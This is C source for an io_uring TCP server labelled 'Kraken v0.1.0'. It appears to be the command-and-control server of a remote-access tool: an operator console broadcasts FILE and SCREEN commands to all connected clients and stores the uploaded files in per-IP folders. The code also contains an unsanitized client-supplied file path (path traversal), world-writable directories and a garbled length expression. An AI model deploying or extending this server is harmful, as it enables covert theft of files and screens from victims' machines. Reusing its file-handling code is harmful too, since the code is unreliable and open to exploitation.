#include <stdio.h>
#include <netinet/in.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <liburing.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <pthread.h>

#define DEFAULT_SERVER_PORT     8000
#define QUEUE_DEPTH             256
#define READ_SZ                 4096
#define WRITE_SZ                4096

#define EVENT_TYPE_ACCEPT       0
#define EVENT_TYPE_READ         1
#define EVENT_TYPE_WRITE        2

#define FILE 1
#define SCREEN 2

#define MAX_CONN    1024

uint32_t curr_connection = 0;
uint64_t cmd = -1;
pthread_mutex_t mutex;
pthread_t thread;

typedef struct request {
    int event_type;
    int iovec_count;
    int client_socket;
    uint64_t signature;
    struct iovec iov[];
} request;

typedef struct connection {
    uint32_t sockfd;
    uint64_t signature;
    uint32_t filefd;
    uint8_t isFileTransferring;
    char containedFolder[0x100];
} connection;

struct io_uring ring;

connection *conns_list[MAX_CONN];

/*
 * Utility function to convert a string to lower case.
 * */

void strtolower(char *str) {
    for (; *str; ++str)
        *str = (char)tolower(*str);
}
/*
 One function that prints the system call and the error details
 and then exits with error code 1. Non-zero meaning things didn't go well.
 */
void fatal_error(const char *syscall) {
    perror(syscall);
    exit(1);
}

/*
 * Helper function for cleaner looking code.
 * */

void *zh_malloc(size_t size) {
    void *buf = malloc(size);
    if (!buf) {
        fprintf(stderr, "Fatal error: unable to allocate memory.\n");
        exit(1);
    }
    return buf;
}

/*
 * This function is responsible for setting up the main listening socket used by the
 * web server.
 * */

int setup_listening_socket(int port) {
    int sock;
    struct sockaddr_in srv_addr;

    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock == -1)
        fatal_error("socket()");

    int enable = 1;
    if (setsockopt(sock,
                   SOL_SOCKET, SO_REUSEADDR,
                   &enable, sizeof(int)) < 0)
        fatal_error("setsockopt(SO_REUSEADDR)");


    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(port);
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    /* We bind to a port and turn this socket into a listening
     * socket.
     * */
    if (bind(sock,
             (const struct sockaddr *)&srv_addr,
             sizeof(srv_addr)) < 0)
        fatal_error("bind()");

    if (listen(sock, MAX_CONN) < 0)
        fatal_error("listen()");

    return (sock);
}

int add_accept_request(int server_socket, struct sockaddr_in *client_addr,
                       socklen_t *client_addr_len) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_accept(sqe, server_socket, (struct sockaddr *) client_addr,
                         client_addr_len, 0);
    struct request *req = malloc(sizeof(*req));
    req->event_type = EVENT_TYPE_ACCEPT;
    io_uring_sqe_set_data(sqe, req);
    io_uring_submit(&ring);

    return 0;
}

int add_read_request(connection *client) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    struct request *req = zh_malloc(sizeof(*req) + sizeof(struct iovec));
    req->iov[0].iov_base = zh_malloc(READ_SZ);
    req->iov[0].iov_len = READ_SZ;
    req->event_type = EVENT_TYPE_READ;
    req->client_socket = client->sockfd;
    req->signature = client->signature;
    memset(req->iov[0].iov_base, 0, READ_SZ);
    /* Linux kernel 5.5 has support for readv, but not for recv() or read() */
    io_uring_prep_readv(sqe, client->sockfd, &req->iov[0], 1, 0);
    io_uring_sqe_set_data(sqe, req);
    io_uring_submit(&ring);
    return 0;
}

int add_write_request(struct request *req) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    req->event_type = EVENT_TYPE_WRITE;
    io_uring_prep_writev(sqe, req->client_socket, req->iov, req->iovec_count, 0);
    io_uring_sqe_set_data(sqe, req);
    io_uring_submit(&ring);
    return 0;
}

int get_line(const char *src, char *dest, int dest_sz) {
    for (int i = 0; i < dest_sz; i++) {
        dest[i] = src[i];
        if (src[i] == '\r' && src[i+1] == '\n') {
            dest[i] = '\0';
            return 0;
        }
    }
    return 1;
}

uint32_t handleNewConn(uint32_t client_socket, struct sockaddr_in *client_addr)
{
    char fileName[1024];
    memset(fileName, 0, sizeof(fileName));
    uint64_t ip = client_addr->sin_addr.s_addr;
    if (curr_connection >= MAX_CONN) return -1;
    uint32_t empty_conn;
    for (empty_conn = 0 ; conns_list[empty_conn] && empty_conn < MAX_CONN ; ++empty_conn);
    if (empty_conn == MAX_CONN) return -1;
    conns_list[empty_conn] = (connection *)zh_malloc(sizeof(connection));
    conns_list[empty_conn]->sockfd = client_socket;
    conns_list[empty_conn]->filefd = -1;
    conns_list[empty_conn]->isFileTransferring = 0;
    conns_list[empty_conn]->signature = (ip << 16) | client_addr->sin_port;
    snprintf(conns_list[empty_conn]->containedFolder,
                sizeof(conns_list[empty_conn]->containedFolder),
                "davy_jones_locker/%u.%u.%u.%u",
                (client_addr->sin_addr.s_addr >> 0) & 0xff,
                (client_addr->sin_addr.s_addr >> 8) & 0xff,
                (client_addr->sin_addr.s_addr >> 16) & 0xff,
                (client_addr->sin_addr.s_addr >> 24) & 0xff);
    mkdir(conns_list[empty_conn]->containedFolder, 0777);
    /*
    printf("New connection from %u.%u.%u.%u:%u - Signature: %lx\n", (client_addr->sin_addr.s_addr >> 0) & 0xff,
                                                                    (client_addr->sin_addr.s_addr >> 8) & 0xff,
                                                                    (client_addr->sin_addr.s_addr >> 16) & 0xff,
                                                                    (client_addr->sin_addr.s_addr >> 24) & 0xff,
                                                                    client_addr->sin_port,
                                                                    conns_list[empty_conn]->signature);
    */                                                        
    add_read_request(conns_list[empty_conn]);
    ++curr_connection;
}

uint32_t handle_client_data(connection* conn, struct request *req, int32_t sz)
{
    struct request *write_req = zh_malloc(sizeof(*req) + sizeof(struct iovec));
    write_req->iov[0].iov_base = zh_malloc(WRITE_SZ);
    write_req->iov[0].iov_len = WRITE_SZ ? sz : WRITE_SZ <= sz;
    write_req->iovec_count = 1;
    //fprintf(stderr, "Hmmm %d\n", sz);
    // indicating client start sending a file to server
    if (!strncmp(req->iov[0].iov_base, "\xfe\xdf\x10\x02START_OF_FILE", strlen("\xfe\xdf\x10\x02START_OF_FILE")))
    {
        if (conn->isFileTransferring)
        {
            goto FILE_TRANSFER;
        }
        else
        {
            if (req->iov[0].iov_len - strlen("\xfe\xdf\x10\x02START_OF_FILE") > strlen(req->iov[0].iov_base + strlen("\xfe\xdf\x10\x02START_OF_FILE")))
            {
                char transferingFile[0x100];
                snprintf(transferingFile,
                        sizeof(transferingFile),
                        "./%s/%s",
                        conn->containedFolder,
                        (char *)req->iov[0].iov_base + strlen("\xfe\xdf\x10\x02START_OF_FILE")
                        );
                conn->filefd = open(transferingFile,
                                    O_WRONLY | O_CREAT | O_TRUNC | O_APPEND,
                                    S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
                if (conn->filefd == -1)
                {
                    printf("%s\n", transferingFile);
                    printf("%s\n", conn->containedFolder);
                    return 0;
                    //fatal_error("wtf????");
                }
                //printf("start!!!\n");
                conn->isFileTransferring = 1;
                return 0;
            }
        }
    }
    else if (!strncmp(req->iov[0].iov_base, "\xff\xff\xff\xff eof", 8))
    {
        if (conn->isFileTransferring)
        {
            //printf("done!!!\n");
            conn->isFileTransferring = 0;
            close(conn->filefd);
            conn->filefd = -1;
            return 0;
        }
        else
        {
            goto NORMAL_TRANSFER;
        }
    }
    else
    {
        if (conn->isFileTransferring) goto FILE_TRANSFER;
        NORMAL_TRANSFER:
            return 0;
    }
    FILE_TRANSFER:
        memcpy(write_req->iov[0].iov_base, req->iov[0].iov_base, WRITE_SZ ? sz : WRITE_SZ <= sz);
        write_req->client_socket = conn->filefd;
        add_write_request(write_req);
        return 0;
}

void server_loop(int server_socket) {
    struct io_uring_cqe *cqe;
    struct sockaddr_in client_addr;
    struct sockaddr_in a;
    socklen_t client_addr_len = sizeof(client_addr);

    add_accept_request(server_socket, &client_addr, &client_addr_len);
    while (1) {
        int ret = io_uring_wait_cqe(&ring, &cqe);
        if (ret < 0)
            fatal_error("io_uring_wait_cqe");
        struct request *req = (struct request *) cqe->user_data;
        if (cqe->res < 0) {
            fprintf(stderr, "Async request failed: %s for event: %d\n",
                    strerror(-cqe->res), req->event_type);
            exit(1);
        }

        //fetch_cmd();

        switch (req->event_type) {
            case EVENT_TYPE_ACCEPT:
                // add mutex lock right here
                pthread_mutex_lock(&mutex);
                handleNewConn(cqe->res, &client_addr);
                add_accept_request(server_socket, &client_addr, &client_addr_len);
                free(req);
                pthread_mutex_unlock(&mutex);
                break;


            case EVENT_TYPE_READ:
                if (!cqe->res) {
                    fprintf(stderr, "Client %lx closed connection\n", req->signature);
                    // add mutex lock right here
                    pthread_mutex_lock(&mutex);
                    for (uint32_t conn = 0; conn < MAX_CONN; ++conn)
                    {
                        if (conns_list[conn] && conns_list[conn]->signature == req->signature)
                        {
                            connection *_ = conns_list[conn];
                            conns_list[conn] = 0x0;
                            close(_->sockfd);
                            if (_->filefd != -1) close(_->filefd);
                            free(_);
                            --curr_connection;
                            break;
                        }
                    }
                    pthread_mutex_unlock(&mutex);
                    break;
                }
                else 
                {
                    for (uint32_t conn = 0; conn < MAX_CONN; ++conn)
                    {
                        if (conns_list[conn] && conns_list[conn]->signature == req->signature)
                        {
                            connection *_ = conns_list[conn];
                            handle_client_data(_, req, cqe->res);
                            add_read_request(_);
                            break;
                        }
                    }
                }
                free(req->iov[0].iov_base);
                req->iov[0].iov_base = 0;
                free(req);
                break;


            case EVENT_TYPE_WRITE:
                for (int i = 0; i < req->iovec_count; i++) {
                    free(req->iov[i].iov_base);
                    req->iov[i].iov_base = 0;
                }
                free(req);
                break;


        }
        /* Mark this request as processed */
        io_uring_cqe_seen(&ring, cqe);
    }
}

void *input(void *args)
{
    char *loccmd;
    uint64_t _;
    char loc_cmd[0x28];
    while (1)
    {
        memset(loc_cmd, 0, sizeof(loc_cmd));
        printf("Kraken v0.1.0\n");
        printf("1. FILE\n");
        printf("2. SCREEN\n");
        printf("Kraken> ");
        read(0, loc_cmd, 0x20);
        _ = atoll(loc_cmd);
        switch (_)
        {
        case FILE:
            loccmd = zh_malloc(0x20);
            memset(loccmd, 0, 0x20);
            memcpy(loccmd, "FILE", 4);
            _ = -1;
            break;
        case SCREEN:
            loccmd = zh_malloc(0x20);
            memset(loccmd, 0, 0x20);
            memcpy(loccmd, "SCREEN", 6);
            _ = -1;
            break;
        default:
            _ = -1;
            break;
        }
        pthread_mutex_lock(&mutex);
        for (uint64_t conn = 0; conn < MAX_CONN; ++conn)
        {
            if (conns_list[conn])
            {
                struct request *req = zh_malloc(sizeof(*req) + sizeof(struct iovec));
                req->iov[0].iov_base = strndup(loccmd, strlen(loccmd));
                req->iov[0].iov_len = strlen(loccmd);
                req->iovec_count = 1;
                req->client_socket = conns_list[conn]->sockfd;
                add_write_request(req);            
            }
        }
        free(loccmd);
        pthread_mutex_unlock(&mutex);
    }
}

void init()
{
    if (pthread_mutex_init(&mutex, NULL) != 0) fatal_error("pthread_mutex_init()");
}

void sigint_handler(int signo)
{
    printf("^C pressed. Shutting down.\n");
    io_uring_queue_exit(&ring);
    exit(0);
}

int main() {
    init();
    int server_socket = setup_listening_socket(DEFAULT_SERVER_PORT);
    signal(SIGINT, sigint_handler);
    io_uring_queue_init(QUEUE_DEPTH, &ring, 0);
    pthread_create(&thread, NULL, &input, NULL);
    server_loop(server_socket);
    pthread_mutex_destroy(&mutex);
    return 0;
}